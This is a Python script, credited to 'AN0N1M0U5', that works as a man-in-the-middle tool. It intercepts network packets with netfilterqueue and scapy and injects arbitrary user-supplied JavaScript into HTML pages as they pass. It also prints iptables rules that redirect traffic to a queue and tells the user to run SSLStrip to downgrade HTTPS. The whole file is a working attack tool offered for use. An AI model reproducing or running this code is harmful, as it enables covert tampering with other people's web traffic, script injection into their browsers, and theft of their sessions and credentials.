#!/usr/bin/env python
#console command: info.txt / iptables --flush

import netfilterqueue
import scapy.all as scapy
import re

print("This script is created by AN0N1M0U5\nInjecting JS code into websites")
print("\n")
print("FIRST SET IPTABLES")
print(">> iptables -I OUTPUT -j NFQUEUE --queue-num 0")
print(">> iptables -I INPUT -j NFQUEUE --queue-num 0")
print(">> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
print("RUN SSLSTRIP")
print("\n\n")
injection_code = raw_input("Insert code to inject: ")
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
	    load = load.replace("HTTP/1.1", "HTTP/1.0")
            
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            
            load = load.replace("</body>", injection_code+"</body>")
            content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_lenght_search and "text/html" in load:
                content_lenght = content_lenght_search.group(1)
                new_content_length = int(content_lenght) + len(injection_code)
                load = load.replace(content_lenght, str(new_content_length))            

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Stopped Injecting Code")
